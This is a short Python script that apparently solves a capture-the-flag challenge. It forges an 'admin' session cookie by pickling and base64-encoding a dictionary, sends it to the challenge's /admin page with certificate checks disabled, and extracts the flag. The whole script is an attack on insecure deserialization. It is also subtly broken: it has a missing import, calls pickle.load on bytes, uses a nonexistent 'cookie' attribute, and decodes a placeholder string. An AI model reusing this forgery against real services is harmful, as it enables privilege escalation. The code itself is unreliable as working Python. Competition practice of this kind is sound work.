#!/usr/bin/env python

import base64 as b;
import pickle;
import requests;
import re;

def main():
#{
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning);
    p = b.b64decode('base64');
    print(pickle.load(p));          # pickle decode

    ours = {'python': 'pickle', 'subtle': 'hint', 'user': 'admin'};
    o = pickle.dumps(ours);         # pickle encode
    cookie = b.b64encode(o);
    
    s = requests.Session();
    s.cookie.update({'obsolutePickle': cookie});
    r = s.get('https://spotted-quoll.ctfcompetition.com/admin', verify=False);
    content = r.text;
    
    matched = re.search('CTF{.*}', content);
    print(matched.group());
#}

if(__name__ == "__main__"):
#{
    main();
#}